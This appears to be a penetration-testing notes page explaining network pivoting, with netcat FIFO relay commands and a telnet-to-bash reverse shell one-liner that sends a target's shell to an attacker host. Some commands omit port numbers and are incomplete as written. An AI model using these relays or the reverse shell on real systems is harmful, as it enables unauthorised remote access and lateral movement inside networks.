# Pivoting

Pivoting is a method used by penetration testers that uses the compromised system to attack other systems on the same network to avoid restrictions such as firewall configurations, which may prohibit direct access to all machines. For example, if an attacker compromises a web server on a corporate network, the attacker can then use the compromised web server to attack other systems on the network. These types of attacks are often called multi-layered attacks. Pivoting is also known as island hopping.

Pivoting can further be distinguished into proxy pivoting and [VPN](../networking/vpn.md) pivoting.

Proxy pivoting is the practice of channeling traffic through a compromised target using a proxy payload on the machine and launching attacks from the computer. This type of pivoting is restricted to certain TCP and UDP ports that are supported by the proxy.

VPN pivoting enables the attacker to create an encrypted layer to tunnel into the compromised machine to route any network traffic through that target machine, for example, to run a vulnerability scan on the internal network through the compromised machine, effectively giving the attacker full network access as if they were behind the firewall.

Typically, the proxy or VPN applications enabling pivoting are executed on the target computer as the payload of an exploit.

Pivoting is usually done by infiltrating a part of a network infrastructure (as an example, a vulnerable printer or thermostat) and using a scanner to find other devices connected to attack them. By attacking a vulnerable piece of networking, an attacker could infect most or all of a network and gain complete control.

## Make a FIFO in the file system 

```shell
mknod [name of file] p
```

## Pivoting with a backpipe #
### On the attacker:

```shell
nc [pivot host]
```

### On the pivot host

```shell
nc localhost 80 <[FIFO file name] | nc -l -p 4444 >[FIFO file name]
```

## Telnet variant (when netcat is not available on the target) #
### Listen on port 80 in terminal 1 on the attack machine

```shell
nc -l -n -v -p 80 
```

### Listen on port 443 in terminal 2 on the attack machine

```shell
nc -l -n -v -p 443
```

### On the target machine:

```shell
telnet [attack host] 80 | /bin/bash | telnet [attack host]
```

